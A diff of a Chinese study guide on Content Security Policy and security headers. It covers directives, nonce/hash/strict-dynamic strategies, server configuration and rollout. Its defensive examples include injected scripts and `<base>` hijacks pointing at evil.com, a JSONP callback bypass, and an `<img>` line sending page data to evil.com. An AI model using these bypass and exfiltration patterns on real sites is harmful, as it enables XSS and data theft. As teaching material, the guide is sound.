@@ -2,7 +2,6 @@
 
 > 覆盖题号：**5、13**
 > 对应原题：《CSP 可以解决什么问题》《前端的常规安全策略》
-> 这一册讲**"用响应头给浏览器立规矩"**——这是前端能主动掌控的、成本最低、收益最大的一层防御。
 
 ---
 
@@ -30,26 +29,24 @@
 
 ### 1.1 一句话结论
 
-**CSP（Content Security Policy，内容安全策略）是一份"白名单声明"，通过响应头告诉浏览器：这个页面只允许从哪些地方加载资源、只允许执行哪些脚本。** 不在白名单里的一律拒绝。
+**CSP（Content Security Policy，内容安全策略）是一份白名单声明，由响应头下发给浏览器：页面只允许从指定来源加载资源、只允许执行带授权的脚本。** 不在名单内的一律拒绝。
 
-**核心价值**：它是**最后一道防线**。即使 XSS 注入成功了，因为注入的 `<script>` 没有 nonce、不在白名单，浏览器也不会执行——**把"XSS 一定导致代码执行"变成"XSS 可能只是一个无害的标签"**。
+它是 XSS 的最后一道防线：注入的 `<script>` 没有 nonce、也不在白名单里，浏览器不会执行。
 
 ### 1.2 交付方式
 
 ```http
-# ① 响应头（推荐）
+# 响应头（推荐）
 Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
 
-# ② meta 标签（不推荐，能力受限）
+# meta（能力受限）
 <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
 ```
 
-| 方式 | 优点 | 局限 |
+| 方式 | 能力 | 局限 |
 |---|---|---|
-| **响应头** | 能力完整；对所有资源类型生效（含 iframe 文档） | 需要服务端/网关配置 |
-| **meta** | 前端能改 | **不支持 `frame-ancestors`、`sandbox`、`report-uri`**；必须在 `<head>` 里且早于任何资源 |
-
-> **为什么不推荐 meta**：最常用的 `frame-ancestors`（防点击劫持）在 meta 里**无效**。而且 meta 只能覆盖 HTML 文档自身，覆盖不到通过 iframe 加载的其他文档。
+| 响应头 | 支持全部指令；约束本文档内所有资源（iframe 文档由它自己的响应头约束） | 需要服务端或网关配置 |
+| meta | 前端可改 | 不支持 `frame-ancestors`、`sandbox`、`report-uri`；必须位于 `<head>` 且早于任何资源 |
 
 ### 1.3 工作原理
 
@@ -64,12 +61,10 @@ flowchart TD
   G --> H["如果配了 report-to<br/>上报到指定地址"]
 ```
 
-**两个关键特性：**
-
 | 特性 | 说明 |
 |---|---|
-| **默认拒绝** | 没声明的指令回落到 `default-src`；都没声明 = 不限制（所以 `default-src` 很重要） |
-| **示例是叠加的** | 多个 CSP 头（或头 + meta）同时存在时，浏览器取**交集**（最严格的） |
+| **默认拒绝** | 没声明的指令回落到 `default-src`；两者都没写才是不限制 |
+| **多策略取交集** | 多个 CSP 头（或头 + meta）同时存在时，浏览器按最严格的那份执行 |
 
 ### 1.4 一个"最小可用"的配置
 
@@ -82,21 +77,15 @@ Content-Security-Policy:
   frame-ancestors 'none';
 ```
 
-**逐条解释（这段能讲清就够专业）：**
-
 | 指令 | 作用 | 为什么这么设 |
 |---|---|---|
-| `default-src 'self'` | 所有资源的兜底：只允许同源 | 默认拒绝，先把门关死 |
-| `script-src 'self'` | 脚本只允许同源 | 挡住外部注入的 `<script src="evil.com">` |
-| `object-src 'none'` | 禁止 `<object>` / `<embed>` / `<applet>` | 这些老插件是绕过的经典入口（如 Flash） |
-| `base-uri 'none'` | 禁止 `<base>` 标签 | **防 `<base href="//evil.com">` 劫持所有相对路径**（超重要的细节） |
+| `default-src 'self'` | 所有资源的兜底：只允许同源 | 先把未声明类型的入口关死 |
+| `script-src 'self'` | 脚本只允许同源 | 挡住 `<script src="evil.com">` |
+| `object-src 'none'` | 禁止 `<object>` / `<embed>` / `<applet>` | 老插件是绕过的经典入口（如 Flash） |
+| `base-uri 'none'` | 禁止 `<base>` 标签 | 防 `<base href="//evil.com">` 劫持相对路径 |
 | `frame-ancestors 'none'` | 禁止被任何页面 iframe 嵌套 | 防点击劫持（见 04 册） |
 
-> **`base-uri` 为什么重要**：如果页面有 `<script src="/app.js">`（相对路径），攻击者注入 `<base href="https://evil.com/">` 后，这个脚本就会从 `evil.com` 加载——**绕过 `script-src 'self'`**。这是一个非常经典的 CSP 绕过手法，`base-uri 'none'` 就是专门堵它的。
-
-### 1.5 30 秒版
-
-> "CSP 是一份白名单，通过响应头告诉浏览器只允许从哪些源加载资源、只允许执行哪些脚本，不在白名单的一律拒绝。它主要防 XSS——即使注入了 `<script>`，没有 nonce、不在白名单就不会执行。典型配置是 `default-src 'self'` 加 `script-src 'nonce-xxx'`，再配 `object-src 'none'`、`base-uri 'none'`、`frame-ancestors 'none'`。它是缓解手段不是根治手段。"
+`base-uri` 单独说明：页面里的 `<script src="/app.js">` 是相对路径，注入 `<base href="https://evil.com/">` 后会改从 `evil.com` 加载，`script-src 'self'` 随之失效；`base-uri 'none'` 堵的就是这条路径。
 
 ---
 
@@ -106,15 +95,15 @@ Content-Security-Policy:
 
 | 指令 | 控制什么 | 常见坑 |
 |---|---|---|
-| `default-src` | **所有未显式声明资源的兜底** | 忘了设 → 其他指令没写就等于不限制 |
+| `default-src` | **所有未显式声明资源的兜底** | 忘设 → 其他指令没写就等于不限制 |
 | `script-src` | JS 来源 | 最关键的指令 |
 | `style-src` | CSS 来源 | **内联 `style` 属性也受它管**，Vue/React 项目最容易卡在这 |
-| `img-src` | 图片 | 注意 `data:` 和 `blob:` 要显式允许 |
+| `img-src` | 图片 | `data:` 和 `blob:` 要显式允许 |
 | `font-src` | 字体 | 字体 CDN 要加白名单 |
-| `connect-src` | `fetch` / `XHR` / `WebSocket` / `EventSource` | **接口域名必须在这**，否则所有请求被拦 |
+| `connect-src` | `fetch` / `XHR` / `WebSocket` / `EventSource` | **接口域名必须在这**，否则请求全被拦 |
 | `media-src` | 音视频 | — |
 | `object-src` | `<object>` / `<embed>` | **建议 `'none'`** |
-| `frame-src` | 可以嵌套哪些 iframe | 不管"谁能嵌套我"（那是 `frame-ancestors`） |
+| `frame-src` | 可以嵌套哪些 iframe | 不管"谁能嵌套本文档"（那是 `frame-ancestors`） |
 | `worker-src` | Worker / SharedWorker / ServiceWorker | — |
 | `manifest-src` | PWA manifest | — |
 
@@ -123,28 +112,29 @@ Content-Security-Policy:
 | 指令 | 控制什么 | 建议 |
 |---|---|---|
 | `base-uri` | `<base>` 标签的 URL | **`'none'`**（防相对路径劫持） |
-| `form-action` | 表单能提交到哪 | `'self'`（防表单劫持把密码发到外部） |
-| `frame-ancestors` | **谁能嵌套我**（防点击劫持） | `'none'` 或 `'self'` |
+| `form-action` | 表单能提交到哪 | `'self'`（防表单把密码发到外部） |
+| `frame-ancestors` | **谁能嵌套本文档**（防点击劫持） | `'none'` 或 `'self'` |
 | `sandbox` | 给页面施加 iframe sandbox 限制 | 一般不用于顶层文档 |
-| `upgrade-insecure-requests` | 把 HTTP 子资源自动升级为 HTTPS | 强烈建议加 |
-| `block-all-mixed-content` | 阻止所有混合内容 | 已被上面的取代 |
+| `upgrade-insecure-requests` | 把 HTTP 子资源自动升级为 HTTPS | 建议加 |
+| `block-all-mixed-content` | 阻止所有混合内容 | 已废弃，由 `upgrade-insecure-requests` 取代 |
 
-> **`frame-src` 和 `frame-ancestors` 方向相反，这是最容易搞混的一对：**
-> - `frame-src`：**我**能嵌入**谁**（我作为父页面）
-> - `frame-ancestors`：**谁**能嵌入**我**（我作为子页面）
-> 防点击劫持用 **`frame-ancestors`**。
+`frame-src` 和 `frame-ancestors` 方向相反：
+
+- `frame-src`：父页面能嵌入谁
+- `frame-ancestors`：子页面能被谁嵌入
 
 ### 2.3 报告类
 
 | 指令 | 说明 |
 |---|---|
-| `report-uri` | 违规上报地址（已废弃但兼容性好） |
-| `report-to` | 新的 Reporting API（需要配 `Report-To` 响应头） |
+| `report-uri` | CSP2 的上报地址，兼容性好，CSP3 标记为废弃 |
+| `report-to` | Reporting API，需要额外的 `Report-To` 响应头 |
 
 ```http
 Content-Security-Policy: default-src 'self'; report-uri /api/csp-report
-Report-To: {"group":"csp","max_age":10886400,"endpoints":[{"url":"https://report.example.com"}]}
+
 Content-Security-Policy: default-src 'self'; report-to csp
+Report-To: {"group":"csp","max_age":10886400,"endpoints":[{"url":"https://report.example.com"}]}
 ```
 
 ### 2.4 来源表达式（Source Expressions）
@@ -155,7 +145,7 @@ Content-Security-Policy: default-src 'self'; report-to csp
 | `'none'` | 什么都不允许 |
 | `'unsafe-inline'` | 允许内联脚本/样式（**危险**） |
 | `'unsafe-eval'` | 允许 `eval` / `new Function` / `setTimeout(string)`（**危险**） |
-| `'nonce-<base64>'` | 只有带这个 nonce 的内联脚本才允许 |
+| `'nonce-<base64>'` | 只有带这个 nonce 的脚本才允许 |
 | `'sha256-<base64>'` | 只有内容哈希匹配的内联脚本才允许 |
 | `'strict-dynamic'` | 信任"由已信任脚本动态创建"的脚本 |
 | `https:` | 允许任意 HTTPS 来源（**等于不限制**） |
@@ -165,7 +155,7 @@ Content-Security-Policy: default-src 'self'; report-to csp
 
 ## 3. script-src 的四种策略（核心）
 
-> 面试问 CSP，真正的分水岭在于：**你能不能说出"为什么光靠域名白名单不够，需要 nonce + strict-dynamic"**。
+四代策略解决同一个问题：怎样在不维护域名清单的前提下，只放行可信脚本。
 
 ### 3.1 策略一：域名白名单（CSP 1.0 时代）
 
@@ -173,16 +163,14 @@ Content-Security-Policy: default-src 'self'; report-to csp
 Content-Security-Policy: script-src 'self' https://cdn.example.com
 ```
 
-**问题：**
-
 | 问题 | 说明 |
 |---|---|
-| **挡不住内联脚本** | 页面里所有 `<script>内容</script>` 和 `onclick="..."` 全部失效 |
-| **挡不住 JSONP 绕过** | 如果白名单里有任何支持 JSONP 的域名，攻击者可以用 `?callback=alert(1)` 执行代码 |
-| **挡不住已知库的 gadget** | 如果白名单里有 AngularJS 等库，可以用它自带的模板功能执行 |
-| **白名单会越加越长** | 业务迭代中不断加域名，最终变成 `https:` |
+| **内联脚本全部失效** | 没有 nonce/hash/`'unsafe-inline'` 时，`<script>...</script>` 和 `onclick="..."` 都不执行；为恢复只能加 `'unsafe-inline'`，等于放弃防护 |
+| **挡不住 JSONP 绕过** | 白名单域名上有 JSONP 接口时，`?callback=alert(1)` 就能执行任意代码 |
+| **挡不住已知库的 gadget** | 白名单内的 AngularJS 等库可用模板能力执行代码 |
+| **白名单只增不减** | 业务迭代不断加域名，最终退化成 `https:` |
 
-**结论**：**域名白名单是"看起来安全"，实际很脆弱**。现代做法是策略二/三。
+结论：域名白名单只约束 URL，不约束脚本内容，白名单里任何一个可编程端点都会放大攻击面。
 
 ### 3.2 策略二：nonce（CSP 2.0，推荐）
 
@@ -195,23 +183,17 @@ Content-Security-Policy: script-src 'nonce-r4nd0mV4lu3=' 'self'
 <script nonce="r4nd0mV4lu3=" src="/app.js"></script>
 <script nonce="r4nd0mV4lu3=">console.log('inline ok')</script>
 
-<!-- 攻击者注入的脚本没有 nonce（他不知道）→ 拒绝执行 -->
+<!-- 注入的脚本没有 nonce → 拒绝执行 -->
 <script>alert(1)</script>
 <script src="https://evil.com/x.js"></script>
 ```
 
-**关键要求（说出来就显专业）：**
-
 | 要求 | 原因 |
 |---|---|
-| **每次请求都要重新生成** | nonce 一旦固定就失去意义（攻击者能从页面源码里读到） |
+| **每次请求都要重新生成** | nonce 固定后，攻击者能从页面源码里读到 |
 | **必须是密码学随机** | `crypto.randomBytes(16).toString('base64')`，不能用时间戳 |
 | **带 nonce 的 HTML 不能被缓存** | 否则同一个 nonce 被复用 |
-| **不要用 `'unsafe-inline'` 搭配 nonce** | 在支持 nonce 的浏览器里 `'unsafe-inline'` 会被忽略，但在老浏览器（CSP1）里会生效 → 等于没防 |
-
-**这是 CSP 最重要的一句话：**
-
-> **`'unsafe-inline'` 和 nonce/hash 同时存在时，支持 CSP2+ 的浏览器会忽略 `'unsafe-inline'`。** 所以正确做法是**只留 nonce，不留 `'unsafe-inline'`**。
+| **不要用 `'unsafe-inline'` 搭配 nonce** | 支持 CSP2+ 的浏览器会忽略 `'unsafe-inline'`，CSP1 浏览器仍会生效 → 等于没防 |
 
 ### 3.3 策略三：hash（CSP 2.0）
 
@@ -224,14 +206,14 @@ Content-Security-Policy: script-src 'sha256-abc123...' 'self'
 <script>console.log('this exact content is allowed')</script>
 ```
 
-**适用场景**：**内容固定的内联脚本**（如埋点初始化代码、`window.__INITIAL_STATE__`）。
+适用场景：内容固定的内联脚本（埋点初始化、`window.__INITIAL_STATE__`）。
 
 | 优点 | 缺点 |
 |---|---|
 | 不用每次生成随机值，可以缓存 | 内容改一个字 hash 就变，要重新配 |
 | 精确到内容 | 不适合频繁变化的脚本 |
 
-**补充**：`'unsafe-hashes'` 允许对**内联事件属性**（`onclick="..."`）做 hash 校验——但这个属性本身就不该用。
+`'unsafe-hashes'` 允许对**内联事件属性**（`onclick="..."`）做 hash 校验，但这个属性本身就不该用。
 
 ### 3.4 策略四：strict-dynamic（CSP 3.0，现代最佳）
 
@@ -239,46 +221,35 @@ Content-Security-Policy: script-src 'sha256-abc123...' 'self'
 Content-Security-Policy: script-src 'nonce-xxx' 'strict-dynamic' https: 'unsafe-inline'
 ```
 
-**作用**：**信任会"传染"**。只要一个脚本是通过"已信任脚本"动态创建的（`document.createElement('script')`、`import()`），它就自动被信任，**不需要 nonce**，并且**忽略域名白名单**。
-
-**为什么需要它：**
+**作用**：信任会沿 DOM 创建链传播。由已信任脚本动态创建的脚本（`document.createElement('script')`、`import()`）自动被信任，**不需要 nonce**；在 CSP3 浏览器里同时**忽略域名白名单**。
 
 ```js
-// 现代框架会动态插入脚本（如 webpack 的 chunk 加载、Vite 的 modulepreload）
+// 已信任的 app.js 里
 const s = document.createElement('script')
-s.src = '/chunk-abc.js'      // 这个脚本没有 nonce！
-document.head.appendChild(s)
+s.src = '/chunk-abc.js' // 这个脚本没有 nonce
+document.head.appendChild(s) // 仍然执行
 ```
 
-如果没有 `strict-dynamic`，你得给每个 chunk 都加 nonce（不现实）。有了它，因为创建者是已信任的 `app.js`，新脚本自动被信任。
+没有 `strict-dynamic` 时，每个 chunk 都要单独加 nonce；现代框架（webpack 的 chunk 加载、Vite 的 modulepreload）无法做到。
 
-**兼容写法（生产常用）：**
+**兼容写法（按浏览器降级）：**
 
-```http
-Content-Security-Policy:
-  script-src 'nonce-xxx' 'strict-dynamic' https: 'unsafe-inline';
-  object-src 'none';
-  base-uri 'none';
-```
+| 浏览器 | 实际生效的源 | 结果 |
+|---|---|---|
+| 支持 CSP3 | `'nonce-...'` + `'strict-dynamic'` | 忽略 `https:`、主机白名单和 `'unsafe-inline'` |
+| 支持 CSP2 | `'nonce-...'`、`https:` | 不识别 `'strict-dynamic'`；`'unsafe-inline'` 因有 nonce 被忽略，但 `https:` 仍放行任意 HTTPS 域 |
+| 只支持 CSP1 | `https:`、`'unsafe-inline'` | nonce 与 `'strict-dynamic'` 都不识别，等同域名白名单 + 内联放行 |
 
-**这个"三件套"的妙处：**
-
-| 浏览器 | 行为 |
-|---|---|
-| **支持 CSP3** | 用 `'nonce'` + `'strict-dynamic'`，**忽略 `https:` 和 `'unsafe-inline'`** → 安全 |
-| **只支持 CSP2** | 用 `'nonce'`，忽略 `'unsafe-inline'` → 安全 |
-| **只支持 CSP1**（老浏览器） | 用 `https:`（允许 HTTPS 来源）→ 降级但仍比 `*` 强 |
-
-> 这是 Google 推荐的"渐进增强"写法。**能说出这个兼容策略，是很强的加分项。**
+只面向现代浏览器时，直接写 `script-src 'nonce-xxx' 'strict-dynamic'` 即可；但 CSP1 浏览器会把 `script-src` 视为空而全部拦截，需要兼容时才补 `https: 'unsafe-inline'` 作为降级。
 
 ### 3.5 四种策略对比
 
-| 策略 | 挡内联 | 挡 JSONP 绕过 | 支持动态 chunk | 维护成本 |
+| 策略 | 内联脚本 | 防 JSONP / gadget 绕过 | 动态 chunk | 维护成本 |
 |---|---|---|---|---|
-| 域名白名单 | ❌ | ❌ | ✅ | 中（会越来越长） |
-| nonce | ✅ | ✅ | ❌（需给每个 chunk 加） | 中 |
-| hash | ✅ | ✅ | ❌ | 高（内容变就失效） |
-| **nonce + strict-dynamic** | ✅ | ✅ | ✅ | **低** |
+| 域名白名单 | 需 `'unsafe-inline'`（失去防护） | ❌ | ✅ | 中（会越来越长） |
+| nonce | nonce 放行 | ✅ | ❌（需给每个 chunk 加） | 中 |
+| hash | hash 放行 | ✅ | ❌ | 高（内容变就失效） |
+| **nonce + strict-dynamic** | nonce 放行 | ✅ | ✅ | **低** |
 
 ---
 
@@ -300,9 +271,10 @@ app.use((req, res, next) => {
     'Content-Security-Policy',
     [
       `default-src 'self'`,
-      `script-src 'nonce-${nonce}' 'strict-dynamic' https: 'unsafe-inline'`,
-      `style-src 'self' 'unsafe-inline'`,       // 样式一般需要放宽，见 10 章
-      `img-src 'self' data: https:`,
+      // 需要兼容 CSP1 时在末尾补 https: 'unsafe-inline'，见 3.4
+      `script-src 'nonce-${nonce}' 'strict-dynamic'`,
+      `style-src 'self' 'unsafe-inline'`, // 见 10.1
+      `img-src 'self' data:`,
       `font-src 'self' https://fonts.gstatic.com`,
       `connect-src 'self' https://api.example.com`,
       `object-src 'none'`,
@@ -310,60 +282,38 @@ app.use((req, res, next) => {
       `frame-ancestors 'none'`,
       `upgrade-insecure-requests`,
       `report-uri /api/csp-report`,
-    ].join('; ')
+    ].join('; '),
   )
 
-  // 关键：带 nonce 的 HTML 不能被共享缓存
+  // 带 nonce 的 HTML 不能被共享缓存
   res.setHeader('Cache-Control', 'private, no-cache')
   next()
 })
 
-// 模板里注入
 app.get('/', (req, res) => {
   res.render('index', { nonce: res.locals.nonce })
 })
 ```
 
 ```html
-<!-- 模板 -->
 <script nonce="<%= nonce %>" src="/app.js"></script>
 ```
 
-### 4.2 Nginx（配合后端注入，或用 sub_filter）
+### 4.2 Nginx
 
 ```nginx
-# 方案一：后端生成，nginx 透传（推荐）
-# 方案二：nginx 自己生成（用 $request_id 作为伪 nonce，安全性弱一些，但比没有强）
+# nonce 由生成 HTML 的一层产生，nginx 只透传
+# 若让 nginx 自己生成：$request_id 不是密码学随机值，只能算弱化方案
 add_header Content-Security-Policy "script-src 'nonce-$request_id' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'" always;
-sub_filter '<script ' '<script nonce="$request_id" ';
-sub_filter_once off;
-
-# 方案三：静态站点用 hash（内容固定）
 ```
 
-> **静态站点（无服务端）怎么办？** 两个办法：
-> 1. 用 **hash**（内容固定，构建时算出每个内联脚本的 sha256）
-> 2. 用 **CDN 的边缘计算**（Cloudflare Workers / Vercel Edge）在响应时注入 nonce
+还要把同一个 nonce 写进 HTML。`sub_filter` 是字符串替换，遇到不带空格的 `<script>` 会漏；由后端模板直接渲染更稳妥。
+
+纯静态站点没有每请求的 HTML 生成过程：用构建期 hash，或在 CDN 边缘函数里改写 HTML 注入 nonce。
 
 ### 4.3 纯前端项目（Vite）的 nonce
 
-Vite 构建会把入口脚本注入 HTML。用插件在构建时或边缘层加 nonce：
-
-```js
-// vite-plugin-csp-guard 或自己写一个简单插件
-export default {
-  name: 'csp-nonce',
-  transformIndexHtml(html) {
-    // 注意：这只在构建时注入一次，nonce 会固定 → 需要配合边缘层
-    return html.replace(/<script /g, '<script nonce="__CSP_NONCE__" ')
-  },
-}
-```
-
-> **这里有个现实困境**：纯静态 + CDN 的架构下，**无法做到"每请求一个 nonce"**。可行的替代是：
-> - 用 **hash**（推荐，因为构建后内容已知）
-> - 或用边缘函数注入
-> - 或退化成"域名白名单 + `strict-dynamic`"
+Vite 构建期只能注入固定字符串，nonce 会变成静态值，失去"每请求随机"的意义。纯静态 + CDN 的常见路径是构建期 hash 或边缘层按请求改写 HTML；两者都做不到时，只能退化为域名白名单。
 
 ---
 
@@ -372,64 +322,50 @@ export default {
 ### 5.1 计算内联脚本的 hash
 
 ```bash
-# 注意：要精确到字节，包括缩进和换行
-echo -n "console.log('hello')" | openssl dgst -sha256 -binary | openssl base64
-# 得到：xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
+# 精确到字节，包括缩进和换行
+printf %s "console.log('hello')" | openssl dgst -sha256 -binary | openssl base64
+# → RiiZMt4WBEeSYPAXi7o6X3AZ0TOyY+/BOcmhjYVr6/E=
 ```
 
 ```http
-Content-Security-Policy: script-src 'sha256-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=' 'self'
+Content-Security-Policy: script-src 'sha256-RiiZMt4WBEeSYPAXi7o6X3AZ0TOyY+/BOcmhjYVr6/E=' 'self'
 ```
 
 ```html
 <script>console.log('hello')</script>   <!-- 内容完全一致才允许 -->
 ```
 
-**工程化做法**：用构建插件自动扫描 HTML 里的内联脚本、算 hash、生成 CSP 头。
+工程化做法是用构建插件扫描 HTML 里的内联脚本、算 hash、生成 CSP 头：
 
 ```js
-// 一个简化版的构建插件
-import crypto from 'crypto'
+import crypto from 'node:crypto'
 
 function computeHashes(html) {
-  const hashes = []
   const re = /<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/g
+  const hashes = []
   let m
   while ((m = re.exec(html))) {
-    const content = m[1]
-    if (!content.trim()) continue
-    const hash = crypto.createHash('sha256').update(content).digest('base64')
-    hashes.push(`'sha256-${hash}'`)
+    if (!m[1].trim()) continue
+    hashes.push(`'sha256-${crypto.createHash('sha256').update(m[1]).digest('base64')}'`)
   }
   return hashes
 }
 ```
 
-### 5.2 strict-dynamic 的两条规则
+### 5.2 strict-dynamic 的适用边界
 
-| 规则 | 说明 |
-|---|---|
-| **① 域名白名单被忽略**（CSP3 浏览器） | `https:`、`cdn.example.com` 都不再生效 |
-| **② 信任可传染** | 由已信任脚本通过 `document.createElement('script')`、`import()`、`appendChild` 创建的脚本自动信任 |
+`'strict-dynamic'` 的信任只沿 DOM 创建链传播：由已信任脚本用 `document.createElement('script')`、`appendChild`、`import()` 创建的脚本自动信任。
 
-```js
-// 已信任的 app.js 里
-const s = document.createElement('script')
-s.src = 'https://cdn.example.com/analytics.js'   // 自动被信任 ✅
-document.head.appendChild(s)
-
-// 但攻击者注入的 <script> 没有 nonce，也不是被信任脚本创建的 → 拒绝
-```
-
-**注意**：`strict-dynamic` **不**让 `innerHTML` 插入的脚本生效（`innerHTML` 里的 `<script>` 本来就不执行）。
+- 解析器插入的 `<script>` 仍需 nonce 或 hash。
+- `innerHTML` 插入的 `<script>` 本来就不执行，`'strict-dynamic'` 不改变这一点。
 
 ---
 
 ## 6. 上线策略：从 report-only 到强制
 
-> **直接上强制 CSP 几乎必然把站点搞挂**（因为你会漏掉某个内联脚本或接口域名）。标准做法是四步灰度。
+直接上强制 CSP 容易把站点打挂，标准做法是灰度推进。
 
-### 6.1 四步流程
+### 6.1 灰度流程
 
 ```mermaid
 flowchart LR
@@ -445,7 +381,7 @@ flowchart LR
 Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self'; report-uri /api/csp-report
 ```
 
-**这个头下，违规不会阻止，只会发送报告。** 可以放心在生产环境跑一周。
+这个头下违规只上报、不拦截，可以在生产环境先跑一段时间。
 
 ### 6.3 第二步：接收报告
 
@@ -464,21 +400,21 @@ app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (r
 })
 ```
 
-**报告里要重点看三件事：**
-
 | 看什么 | 说明 |
 |---|---|
-| `violated-directive` | 哪条指令被触发（说明你漏配了哪个域） |
+| `violated-directive` | 哪条指令被触发（说明漏配了哪个域） |
 | `blocked-uri` | 被拦的具体 URL |
-| `source-file` + `line-number` | 是哪段代码触发的（用于定位内联脚本） |
+| `source-file` + `line-number` | 哪段代码触发的（用于定位内联脚本） |
+
+`report-to` 的报文是 Reporting API 的数组格式，字段名与 `report-uri` 不同，解析要分别处理。
 
 ### 6.4 第三步：常见修复
 
 | 报告内容 | 修复 |
 |---|---|
-| `script-src` 拦了某 CDN | 加白名单（或改用 nonce + strict-dynamic 后就不需要） |
+| `script-src` 拦了某 CDN | 加白名单；改用 nonce + strict-dynamic 后不再需要 |
 | `script-src` 拦了内联脚本 | 加 nonce，或把内联代码抽成外部文件 |
-| `style-src` 拦了内联 style | 见第 10 章（Vue/React 的内联样式问题） |
+| `style-src` 拦了内联 style | 见 10.1 |
 | `connect-src` 拦了接口 | 加接口域名 |
 | `img-src` 拦了 data URL | 加 `data:` |
 
@@ -488,13 +424,11 @@ app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (r
 Content-Security-Policy: ...; report-uri /api/csp-report
 ```
 
-**保留上报**很重要——上线后仍会出现新的违规（新加的第三方脚本、新的接口域名），这是"性能/安全回归检测"的一部分。
+保留上报：新接入的第三方脚本、新的接口域名都会以违规形式暴露，作为回归检测。
 
 ---
 
 ## 7. CSP 的边界：它能防什么、不能防什么
-
-> **这一节是"深度分水岭"。** 只会说 CSP 能防 XSS 是及格；能说清它防不住什么，才是真的懂。
 
 ### 7.1 能防
 
@@ -510,41 +444,38 @@ Content-Security-Policy: ...; report-uri /api/csp-report
 | 表单劫持（密码发到外部） | `form-action 'self'` |
 | HTTP 降级 | `upgrade-insecure-requests` |
 
-### 7.2 不能防（重要）
+### 7.2 不能防
 
 | 场景 | 为什么 CSP 管不了 |
 |---|---|
-| **数据外带（exfiltration）** | 如果 `img-src` 允许 `https:`，XSS 仍可用 `<img src="https://evil.com/?data=...">` 把数据带出去 |
-| **DOM 型 XSS 的"非脚本"部分** | 如 `<a href="javascript:...">`（受 `script-src` 约束，但如果页面本身允许 `unsafe-inline` 就无效）；或者页面自己把数据写入 `innerHTML` 造成的 UI 欺骗 |
+| **数据外带（exfiltration）** | `img-src` 允许 `https:` 时，XSS 仍可用 `<img src="https://evil.com/?data=...">` 带出数据 |
+| **非脚本型 DOM 问题** | 页面把不可信数据写进 `innerHTML` 造成的 UI 欺骗不受 CSP 约束 |
 | **服务端漏洞** | SQL 注入、越权、SSRF 全在服务端 |
-| **CSRF** | 与 CSP 无关（`form-action` 只限制表单目标） |
+| **CSRF** | CSP 不校验请求来源，也不提供 token；`form-action` 只限制表单提交目标 |
 | **业务逻辑漏洞** | 如价格篡改、越权操作 |
-| **第三方脚本自身被攻陷** | 如果在白名单里，它干坏事 CSP 不管（**供应链风险**） |
-| **已经存在的合法脚本被滥用** | 如 JSONP 接口被利用（除非有 strict-dynamic） |
-| **社工 / 钓鱼** | 完全无关 |
+| **第三方脚本自身被攻陷** | 在白名单内就放行，属于供应链风险 |
+| **社工 / 钓鱼** | 与 CSP 无关 |
 
-### 7.3 一句精确的总结（可以直接背）
+### 7.3 定位
 
-> "CSP 是**缓解（mitigation）**不是**修复（fix）**。它能把'XSS 必然导致代码执行'降级成'XSS 可能只是一个坏掉的标签'，但它不能阻止数据外带、不能替代输出编码、不能防服务端漏洞。**正确的定位是：输出编码是第一道防线，CSP 是第二道，Trusted Types 是第三道。**"
+CSP 是**缓解（mitigation）**，不是**修复（fix）**。它降低 XSS 的可利用性，不替代输出编码，也不覆盖服务端漏洞。防线顺序：输出编码 → CSP → Trusted Types。
 
 ---
 
 ## 8. CSP 的常见绕过手法（理解为什么不能只靠它）
 
-> 这些不是让你去攻击，而是让你理解"**为什么域名白名单不够、为什么要 strict-dynamic**"。
-
 | 绕过手法 | 原理 | 防御 |
 |---|---|---|
 | **JSONP 端点** | 白名单域名上有 JSONP 接口 → `?callback=alert(1)` 直接执行 | 用 nonce + strict-dynamic（忽略白名单）；或清理白名单里的 JSONP 域名 |
 | **`<base>` 劫持** | 注入 `<base href="//evil.com">`，相对路径脚本改从攻击者域加载 | `base-uri 'none'` |
-| **已知库 gadget** | 白名单里的 AngularJS / 老版本 jQuery 有模板执行能力 | 不打不合规的库；用 strict-dynamic |
+| **已知库 gadget** | 白名单里的 AngularJS / 老版本 jQuery 有模板执行能力 | 不用不合规的库；用 strict-dynamic |
 | **`unsafe-eval` 存在** | 任何能控制字符串的地方都能执行代码 | 去掉 `unsafe-eval` |
-| **`unsafe-inline` 存在** | 等于没配 script-src | 去掉（用 nonce） |
+| **`unsafe-inline` 存在** | 等于没配 `script-src` | 去掉，改用 nonce |
 | **开放重定向** | 白名单域上有跳转接口，可跳到 `evil.com` | 修开放重定向 |
 | **`script-src` 允许 `data:`** | 可以 `<script src="data:text/javascript,...">` | 不允许 `data:` |
-| **CSP 只写在 meta 里** | 部分指令失效；且 HTML 前面的资源已经加载 | 用响应头 |
+| **CSP 只写在 meta 里** | 部分指令失效；且 meta 之前的资源已经加载 | 用响应头 |
 
-> **面试时的表达**："CSP 的白名单策略容易被'白名单域名上的 JSONP 接口'和'库 gadget'绕过，所以我更倾向 nonce + strict-dynamic，让域名白名单在 CSP3 浏览器里失效，只信任带 nonce 的入口脚本。"
+结论：域名白名单不是安全边界；nonce/hash + `strict-dynamic` 把信任收敛到入口脚本，才不依赖白名单里第三方的行为。
 
 ---
 
@@ -566,6 +497,8 @@ Content-Security-Policy: ...; report-uri /api/csp-report
 | `Cache-Control`（敏感页） | 敏感页面被缓存/回退键看到 | `no-store` |
 | ~~`X-XSS-Protection`~~ | 老浏览器 XSS 过滤器 | **`0`**（关掉） |
 
+`X-Frame-Options` 与 `frame-ancestors` 同时存在时，Chrome 以 `frame-ancestors` 为准，`X-Frame-Options` 被忽略（实测见 12 节）。
+
 ### 9.2 HSTS 详解
 
 ```http
@@ -576,31 +509,23 @@ Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
 |---|---|
 | `max-age` | 浏览器记住"这个域必须用 HTTPS"的秒数 |
 | `includeSubDomains` | 所有子域也强制 HTTPS |
-| `preload` | 申请加入浏览器内置列表（**硬编码在浏览器里，即使用户第一次访问也用 HTTPS**） |
+| `preload` | 进入浏览器内置列表，首次访问也不会走 HTTP |
 
